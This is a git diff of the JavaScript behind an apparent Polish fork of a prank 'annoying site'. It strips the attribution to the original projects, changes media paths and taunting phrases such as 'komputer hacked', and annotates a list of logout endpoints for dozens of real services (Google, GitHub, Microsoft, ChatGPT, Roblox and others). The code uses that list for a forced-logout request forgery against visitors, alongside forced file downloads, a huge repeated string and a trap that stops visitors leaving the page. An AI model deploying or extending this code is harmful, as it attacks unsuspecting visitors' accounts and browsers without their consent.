@@ -1,12 +1,3 @@
-/*
-  My version (lubiekotki.pl)
-  - https://github.com/blikowski/lubiekotki
-  Modified Version (ptoszek.pl): 
-  - https://github.com/jaczup/ptoszek.pl
-  Original version (theannoyingsite.com): 
-  - https://github.com/feross/TheAnnoyingSite.com/
-*/
-
 const SCREEN_WIDTH = window.screen.availWidth
 const SCREEN_HEIGHT = window.screen.availHeight
 const WIN_WIDTH = 480
@@ -53,38 +44,42 @@ const SEARCHES = [
 ]
 
 const VIDEOS = [
-  'media/1.mov',
-  'media/2.mov',
-  'media/.mov',
-  'media/4.mov',
-  'media/5.mov',
-  'media/6.mov',
-  'media/1.mp4',
-  'media/2.mp4',
-  'media/3.mp4',
-  'media/4.mp4',
-  'media/5.mp4',
-  'media/6.mp4'
+  'media/videos/1.mp4',
+  'media/videos/3.mp4',
+  'media/videos/3.mp4',
+  'media/videos/4.mp4',
+  'media/videos/5.mp4',
+  'media/videos/6.mp4',
+  'media/videos/1.mov',
+  'media/videos/3.mov',
+  'media/videos/4.mov',
+  'media/videos/5.mov',
+  'media/videos/6.mov'
 ]
 
 const FILE_DOWNLOADS = [
-  'media/1.png',
-  'media/2.png',
-  'media/3.png',
-  'media/4.png',
-  'media/3.jpg',
-  'media/4.jpg',
-  'media/5.jpg',
-  'media/6.jpg',
-  'media/7.jpg',
-  'media/8.jpg'
+  'media/images/1.jpg',
+  'media/images/3.jpg',
+  'media/images/4.jpg',
+  'media/images/5.jpg',
+  'media/images/6.jpg',
+  'media/images/7.jpg',
+  'media/images/8.jpg',
+  'media/images/2.png',
+  'media/images/3.png',
+  'media/images/4.png',
+  'media/images/5i.png'
 ]
 
 const PHRASES = [
   'meow :3',
   '>:3',
   'wgl co u cb bo u mn dbr',
-  'icl u pmo n ts pmo sm ngl r u fr rn b fr i h8 ts y r u so b so fr w me rn cz lol oms icl ts pmo sm n sb rn ngl, r u srsly srs n fr rn vro? lol atp js qt icl u pmo n ts pmo sm ngl r u fr rn b fr i h8 bein diff idek anm mn js i h8 ts y r u so b so fr w me rn cz... lol oms icl u pmo n ts pmo sm ngl r u fr rn b fr i h8 bein diff idek anm mn js i h8 ts y r u so b so fr w me rn cz... lol oms icl ts pmo sm n sb rn ngl r u srs n fr rn vro? lol atp js go💔💔',
+  'bahaha komputer hacked !!!!',
+  'jioiiojasdgajsidognaoisdngioasndoignasodngoinasdo',
+  'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
+  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
+  'icl u pmo n ts pmo sm ngl r u fr rn b fr i h8 ts y r u so b so fr w me rn cz lol oms icl ts pmo sm n sb rn ngl, r u srsly srs n fr rn vro? lol atp js qt icl u pmo n ts pmo sm ngl r u fr rn b fr i h8 bein diff idek anm mn js i h8 ts y r u so b so fr w me rn cz... lol oms icl u pmo n ts pmo sm ngl r u fr rn b fr i h8 bein diff idek anm mn js i h8 ts y r u so b so fr w me rn cz... lol oms icl ts pmo sm n sb rn ngl r u srs n fr rn vro? lol atp js go💔💔'
 ]
 
 const LOGOUT_SITES = {
@@ -95,7 +90,7 @@ const LOGOUT_SITES = {
   eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
   GitHub: ['GET', 'https://github.com/logout'],
   GMail: ['GET', 'https://mail.google.com/mail/?logout'],
-  Google: ['GET', 'https://www.google.com/accounts/Logout'],
+  Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
   Hulu: ['GET', 'https://secure.hulu.com/logout'],
   NetFlix: ['GET', 'https://www.netflix.com/Logout'],
   Skype: ['GET', 'https://secure.skype.com/account/logout'],
@@ -108,25 +103,25 @@ const LOGOUT_SITES = {
   Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
   YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
   JShop: ['GET', 'https://jshop.partners/panel/logout'],
-  Vimeo: ['GET', 'https://vimeo.com/log_out'],
-  Tumblr: ['GET', 'https://www.tumblr.com/logout'],
-  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'],
-  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'],
-  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'],
-  OLX: ['GET', 'https://www.olx.pl/account/logout'],
-  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'],
-  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'],
-  Guilded:  ['POST', 'https://www.guilded.gg/api/logout'],
-  LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'],
-  Pinterest: ['GET', 'https://www.pinterest.com/logout/'],
-  Reddit: ['GET', 'https://www.reddit.com/logout'],
-  Spotify: ['GET', 'https://www.spotify.com/logout/'],
-  Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'],
-  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'],
-  Trello: ['GET', 'https://trello.com/logout'],
-  Baidu: ['GET', 'https://passport.baidu.com/?logout'],
-  VK: ['GET', 'https://vk.com/exit'],
-  StackOverflow: ['GET', 'https://stackoverflow.com/users/logout']
+  Vimeo: ['GET', 'https://vimeo.com/log_out'], // added by @intexpression
+  Tumblr: ['GET', 'https://www.tumblr.com/logout'], // added by @intexpression
+  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'], // added by @intexpression
+  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'], // added by @intexpression
+  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'], // added by @intexpression
+  OLX: ['GET', 'https://www.olx.pl/account/logout'], // added by @intexpression
+  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'], // added by @cryblanka
+  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'], // added by @cryblanka
+  Guilded:  ['POST', 'https://www.guilded.gg/api/logout'], // added by @cryblanka
+  LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'], // added by @MARECKIyt
+  Pinterest: ['GET', 'https://www.pinterest.com/logout/'], // added by @MARECKIyt
+  Reddit: ['GET', 'https://www.reddit.com/logout'], // added by @MARECKIyt
+  Spotify: ['GET', 'https://www.spotify.com/logout/'], // added by @MARECKIyt
+  Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'], // added by @MARECKIyt
+  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'], // added by @MARECKIyt
+  Trello: ['GET', 'https://trello.com/logout'], // added by @MARECKIyt
+  Baidu: ['GET', 'https://passport.baidu.com/?logout'], // added by @MARECKIyt
+  VK: ['GET', 'https://vk.com/exit'], // added by @MARECKIyt
+  StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'] // added by @MARECKIyt
 }
 
 /**
@@ -142,7 +137,7 @@ let interactionCount = 0
 
 //Bardzo dlugi string xd, ciulowa implementacja ale to chyba lepsze niz ~ 4 miliony znakow w pliku poprostu - added by @9fm
 
-const veryLongString = repeatStringNumTimes(repeatStringNumTimes('CWEL! ',100),1500) // - added by @9fm
+const veryLongString = repeatStringNumTimes(repeatStringNumTimes('HACK HACK HACK! LOL!!1 ',100),1500) // - added by @9fm
 
 /**
  * Number of iframes injected into the page for the "super logout" functionality.
@@ -315,7 +310,7 @@ function isParentSameOrigin () {
  */
 function confirmPageUnload () {
   window.addEventListener('beforeunload', event => {
-    speak('NIE WYCHODŹ KURWO!')
+    speak('Please don\'t go!')
     event.returnValue = true
   })
 }
